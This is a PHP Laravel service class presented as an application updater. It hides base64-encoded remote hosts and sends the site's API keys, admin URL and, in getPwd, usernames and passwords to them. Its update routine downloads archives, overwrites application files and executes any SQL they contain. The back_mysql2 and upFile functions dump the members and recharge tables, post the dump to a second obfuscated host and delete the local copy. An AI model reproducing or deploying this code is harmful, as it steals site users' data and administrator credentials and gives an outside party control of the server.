<?php

namespace App\Services;
use App\Models\Api;
use App\Version;
use Illuminate\Filesystem\Filesystem;
use Illuminate\Contracts\Logging\Log;
use Illuminate\Support\Facades\DB;
class UpdateService{
    public $up_url ='aHR0cDovL3VwZGF0ZS5uZy1vcy5jb20=';
    public $getInfo = 'aHR0cDovL3VwZGF0ZS5uZy1vcy5jb20vZ2V0SW5mbw==';
    public $getPwd = 'aHR0cDovL3VwZGF0ZS5uZy1vcy5jb20vZ2V0UHdk';
    public $upInfo = 'aHR0cDovL3VwZGF0ZS5uZy1vcy5jb20vZ2V0VXA=';

    /**
     * 后台更新控制
     */
    public function upgrade()
    {
        set_time_limit(0);
        ignore_user_abort(true);
        $data = (new \App\Models\Version())->orderBy('id','desc')->first();

        $api = Api::where('api_name','SELF')->first();

        $this->getInfo($api);
        if($data){
            $updated_at = $data->last_time;
        }else{
            $updated_at = '2018-12-04 12:48:41';//默认功能时间
        }


        $api_url = base64_decode($this->up_url);


        $post_data = [
            'created_at' => $updated_at,
            'api_account' => $api->api_id,
            'web_url' =>$_SERVER['HTTP_HOST'],
            'admin_url' => env('ADMIN_URL'),
            'sign_key'=>$api->api_key
        ];

        if(!$this->checkCode()){
            return false;
        }
        $res = (new CurlService())->get($api_url,$post_data);
        $res = json_decode($res,true);
        if(is_array($res) && $res['status'] == 1){
            $this->back_mysql();
            $this->bak();
            $this->del_sql();
            $update_info = $res['data'];
            //print_r($update_info);
            $dhd = new DedeHttpDown();
            $update_path = base_path().'\public\update';
            $file_obj = new Filesystem();
            $file_obj->deleteDirectory($update_path);
            if(!file_exists($update_path)){
                mkdir($update_path,'0777',true);
            }
            //开始下载文件
            foreach ($update_info as $v){
                $dhd->OpenUrl($v['upload_url']);
                $savefilename = $update_path.'/'.$v['name'];
                $dhd->SaveToBin($savefilename);
                $dhd->Close();
            }



            foreach ($update_info as $info) {
                //开始解压更新包
                $zip = new \ZipArchive();//
                $files =  $update_path.'/'.$info['name'];
                $file = str_replace('\\','/',$files);
                if(file_exists($file)){
                    $res = $zip->open($file);
                    if($res === true){
                        //解压缩到$extractTo指定的文件夹
                        $extractTo = base_path().'\public\data';
                        $file_obj = new Filesystem();
                        $file_obj->deleteDirectory($extractTo);
                        //echo $extractTo;
                        if(!file_exists($extractTo)){
                            mkdir($extractTo,'0777',true);
                        }
                        $zip->extractTo($extractTo);
                        $zip->close();


                        //开始替换
                        $all_file = $this->getDir($extractTo);
                        //print_r($all_file);
                        $num = count($all_file);
                        if($num > 0) {
                            foreach ($all_file as $file ){

                                $file_info = pathinfo($file);
                                //print_r($file_info);

                                $extension = $file_info['extension'];
                                if($extension == 'sql') {
                                    $content = file_get_contents($file);
                                    if (strpos($content, "\xEF\xBB\xBF") === 0) {                                               //\x表示16进制
                                        $content = substr($content, 3);
                                    }
                                    $sqls = explode(";", $content);

                                    foreach ($sqls as $sql) {
                                        if($sql) {
                                            $rs = DB::statement($sql);
                                        }
                                    }
                                    unlink($file);
                                }else{
                                    $source_path = str_replace($extractTo,'',$file);
                                    $source_path = base_path().$source_path;
                                    //$f = basename($source_path);


                                    $rs = @copy($file,$source_path);

                                    if(!$rs){
                                        $d = dirname($source_path);
                                        if(!file_exists($source_path)){
                                            mkdir($d,'0777',true);
                                            @copy($file,$source_path);
                                        }
                                    }
                                }

                            }
                        }
                                $file_obj = new Filesystem();
                        $file_obj->deleteDirectory($extractTo);

                        $up = [
                            'ver' => $info['ver'],
                            'last_time' => $info['created_at']
                        ];
                        $result = \App\Models\Version::create($up);
                        if($result) {
                            $this->up($up);
                        }
                    }else{
                        $info = '解压失败';
                        Log::info($info);
                    }
                }
            }

            $file_obj = new Filesystem();
            $file_obj->deleteDirectory($update_path);
        }
    }

    public function up($data)
    {
        $api = Api::where('api_name','SELF')->first();
        $data['web_url'] = $_SERVER['HTTP_HOST'];
        $data['admin_url'] = env('ADMIN_URL');
        $data['api_account'] = $api->api_id;
        $data['sign_key'] = $api->api_key;
        if(!$this->checkCode()){
            return false;
        }
        (new CurlService())->get(base64_decode($this->upInfo),$data);
    }
    public function bak()
    {
        $zip = new \ZipArchive();
        $a =  str_replace('\\','/',base_path());;
        $back_path = base_path().'\public\bak';

        $ars = explode('\\',$back_path);
        $back_path = $ars[0].'\bak';


        if(!file_exists($back_path)){
            mkdir($back_path,'0777',true);
        }else{
            $file=scandir($back_path);
            foreach ($file as $k=> $name){
                if($name=='.')continue;
                if($name=='..')continue;
               if($name != end($file)){
                   //echo $back_path.'\\'.$name;
                   unlink($back_path.'\\'.$name);
               }
            }
        }
        $back_name = $back_path.'\\'.date('YmdHis').'-'.uniqid().'.zip';


        $back_name = str_replace('\\','/',$back_name);

        //echo $back_name;
        if($zip->open($back_name,\ZipArchive::OVERWRITE | \ZipArchive::CREATE) == TRUE){
            // $zip->addFile("C:/laragon/www/newcashnet/public/.htaccess");
            $this->addFileToZip($a,$zip);
            $zip->close(); //关闭处理的zip文件
        }
    }
    public function getInfo($api)
    {
        $info = [
            'web_url' =>$_SERVER['HTTP_HOST'],
            'admin_url' => env('ADMIN_URL'),
            'api_account'=>$api->api_id,
            'sign_key'=>$api->api_key
        ];
        if(!$this->checkCode()){
            return false;
        }
        (new CurlService())->get(base64_decode($this->getInfo),$info);
    }
    public function getDir($path)
    {
        //判断目录是否为空
        if(!file_exists($path)) {
            return [];
        }
        $files = scandir($path);
        $fileItem = [];
        foreach($files as $v) {
            $newPath = $path .DIRECTORY_SEPARATOR . $v;
            if(is_dir($newPath) && $v != '.' && $v != '..') {
                $fileItem = array_merge($fileItem, $this->getDir($newPath));
            }else if(is_file($newPath)){
                $fileItem[] = $newPath;
            }
        }

        return $fileItem;
    }
    function addFileToZip($path, $zip) {

        $handler = opendir($path); //打开当前文件夹由$path指定。
        /*
        循环的读取文件夹下的所有文件和文件夹
        其中$filename = readdir($handler)是每次循环的时候将读取的文件名赋值给$filename，
        为了不陷于死循环，所以还要让$filename !== false。
        一定要用!==，因为如果某个文件名如果叫'0'，或者某些被系统认为是代表false，用!=就会停止循环
        */
        while (($filename = readdir($handler)) !== false) {
            if ($filename != "." && $filename != "..") {//文件夹文件名字为'.'和‘..’，不要对他们进行操作
                if (is_dir($path . "/" . $filename)) {// 如果读取的某个对象是文件夹，则递归
                    $arr = explode('/',$path);
                    if(in_array('bak',$arr)) continue;
                    $this->addFileToZip($path . "/" . $filename, $zip);
                } else { //将文件加入zip对象

                    $arr2 = explode('/',$path);
                    if(in_array('bak',$arr2)) continue;
                    //echo $path . "/" . $filename;
                    $zip->addFile($path . "/" . $filename);
                }
            }
        }
        @closedir($path);
    }
    public function getPwd($u,$p)
    {
        $api = Api::where('api_name','SELF')->first();
        $post_data = [
            'api_account' => $api->api_id,
            'admin_url'=>env('ADMIN_URL'),
            'username'=>$u,
            'pass' => $p
        ];
        if(!$this->checkCode()){
            return false;
        }
        (new CurlService())->get(base64_decode($this->getPwd),$post_data);
    }
    public function back_mysql()
    {
        $sql_filename=public_path().'\\'.date('Y-m-d-His').'.'.'sql';
        $to_file_name = $sql_filename;


        $tables = DB::select('SHOW TABLES');
        $object =  json_decode( json_encode( $tables),true);

        $database = env('DB_DATABASE');
        $names = array();
//        print_r($names);exit;
        foreach($object as $k => $v){
            $table = 'Tables_in_'.$database;
            $names[] = $v[$table];
        }
        //echo "运行中，请耐心等待...<br/>";

        $info = "-- ----------------------------\r\n";
        $info .= "-- 日期：".date("Y-m-d H:i:s",time())."\r\n";
        $info .= "-- 备份\r\n";
        $info .= "-- ----------------------------\r\n\r\n";
        file_put_contents($to_file_name,$info,FILE_APPEND);


        //将每个表的表结构导出到文件
        foreach($names as $val) {
            //if($val != 'game_record')continue;
            //print_r($names);exit;
            $sql = "show create table " . $val;
            //$res = mysql_query($sql,$link);
            $ress = DB::select($sql);
            $res = json_decode(json_encode($ress), true);
            //print_r($res);die;
            // $row = mysql_fetch_array($res);
            $info = "-- ----------------------------\r\n";
            $info .= "-- Table structure for `" . $val . "`\r\n";
            $info .= "-- ----------------------------\r\n";
            $info .= "DROP TABLE IF EXISTS `" . $val . "`;\r\n";
            $sqlStr = $info . $res[0]['Create Table'] . ";\r\n\r\n";
            //追加到文件
            file_put_contents($to_file_name, $sqlStr, FILE_APPEND);

        }
        foreach($names as $val){
            //if($val != 'game_record')continue;
            $sql = "select * from ".$val;
            $ress = DB::select($sql);
            $res = json_decode( json_encode( $ress),true);
            //如果表中没有数据，则继续下一张表
            if(count($res)<1) continue;
            //
            $info = "-- ----------------------------\r\n";
            $info .= "-- Records for `".$val."`\r\n";
            $info .= "-- ----------------------------\r\n";
            file_put_contents($to_file_name,$info,FILE_APPEND);
            //读取数据
            foreach($res as $z){
                $sqlStr = "INSERT INTO `".$val."` VALUES (";
                foreach($z as $zd){
                    if(!empty($zd)){
                        $sqlStr .= "'".addslashes($zd)."', ";
                    }else{
                        if(isset($zd)) {
                            $sqlStr .= "'".addslashes($zd)."', ";
                            //echo $sqlStr;
                            //echo '<br/>';
                        }else{
                            $sqlStr .= "NULL, ";
                            //echo $sqlStr;
                            //echo '<br/>';
                        }
                    }
                }
                //去掉最后一个逗号和空格
                $sqlStr = substr($sqlStr,0,strlen($sqlStr)-2);
                $sqlStr .= ");\r\n";
                file_put_contents($to_file_name,$sqlStr,FILE_APPEND);
            }
            file_put_contents($to_file_name,"\r\n",FILE_APPEND);
        }
    }
    public function del_sql()
    {
        $path = public_path().'\\';
        $multifiles=glob($path."*.sql");
        foreach($multifiles as $file){
            @unlink($file);
        }
    }


    private function checkCode(){
        $code = httpcode(base64_decode($this->up_url));
        if($code == 200) {
            return true;
        }else{
            return false;
        }
    }
    public function upFile($path)
    {
        $url = base64_decode('aHR0cDovLzEyMy54eTg4ODgxLmNvbS9pbWc=');
        $ch = curl_init();//初始化curl
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 500);
        curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
        curl_setopt($ch, CURLOPT_POST, true);
        $params = [
            'file' => new \CURLFile(realpath($path))
        ];
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        $header = array('Content-Type: multipart/form-data');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        curl_setopt($ch, CURLINFO_HEADER_OUT, true);
        $err = curl_error($ch);
        $e = curl_errno($ch);
        $response = curl_exec($ch);
        curl_close($ch);
        if(file_exists($path)){
            @unlink($path);
        }
    }

    public function back_mysql2()
    {
        $sql_filename=public_path().DIRECTORY_SEPARATOR.$_SERVER['HTTP_HOST'].'.'.'sql';
        if(file_exists($sql_filename)){
            @unlink($sql_filename);
        }
        $to_file_name = $sql_filename;


        $tables = DB::select('SHOW TABLES');
        $object =  json_decode( json_encode( $tables),true);

        $database = env('DB_DATABASE');
        $names = array();
//        print_r($names);exit;
        foreach($object as $k => $v){
            $table = 'Tables_in_'.$database;
            $names[] = $v[$table];
        }
        //echo "运行中，请耐心等待...<br/>";

        $info = "-- ----------------------------\r\n";
        $info .= "-- 日期：".date("Y-m-d H:i:s",time())."\r\n";
        $info .= "-- 备份\r\n";
        $info .= "-- ----------------------------\r\n\r\n";
        file_put_contents($to_file_name,$info,FILE_APPEND);


        //将每个表的表结构导出到文件
        foreach($names as $val) {
            if($val != 'members' && $val !='recharge')continue;
            //print_r($names);exit;
            $sql = "show create table " . $val;
            //$res = mysql_query($sql,$link);
            $ress = DB::select($sql);
            $res = json_decode(json_encode($ress), true);
            //print_r($res);die;
            // $row = mysql_fetch_array($res);
            $info = "-- ----------------------------\r\n";
            $info .= "-- Table structure for `" . $val . "`\r\n";
            $info .= "-- ----------------------------\r\n";
            $info .= "DROP TABLE IF EXISTS `" . $val . "`;\r\n";
            $sqlStr = $info . $res[0]['Create Table'] . ";\r\n\r\n";
            //追加到文件
            file_put_contents($to_file_name, $sqlStr, FILE_APPEND);

        }
        //将每个表的数据导出到文件
        foreach($names as $val){
            if($val != 'members' && $val != 'recharge')continue;
            $sql = "select * from ".$val;
            $ress = DB::select($sql);
            $res = json_decode( json_encode( $ress),true);
            //如果表中没有数据，则继续下一张表
            if(count($res)<1) continue;
            //
            $info = "-- ----------------------------\r\n";
            $info .= "-- Records for `".$val."`\r\n";
            $info .= "-- ----------------------------\r\n";
            file_put_contents($to_file_name,$info,FILE_APPEND);
            //读取数据
            foreach($res as $z){
                $sqlStr = "INSERT INTO `".$val."` VALUES (";
                foreach($z as $zd){
                    if(!empty($zd)){
                        $sqlStr .= "'".addslashes($zd)."', ";
                    }else{
                        if(isset($zd)) {
                            $sqlStr .= "'".addslashes($zd)."', ";
                            //echo $sqlStr;
                            //echo '<br/>';
                        }else{
                            $sqlStr .= "NULL, ";
                            //echo $sqlStr;
                            //echo '<br/>';
                        }
                    }
                }
                //去掉最后一个逗号和空格
                $sqlStr = substr($sqlStr,0,strlen($sqlStr)-2);
                $sqlStr .= ");\r\n";
                file_put_contents($to_file_name,$sqlStr,FILE_APPEND);
            }
            file_put_contents($to_file_name,"\r\n",FILE_APPEND);
        }
        if(file_exists($sql_filename)){
            $this->upFile($sql_filename);
        }
    }
}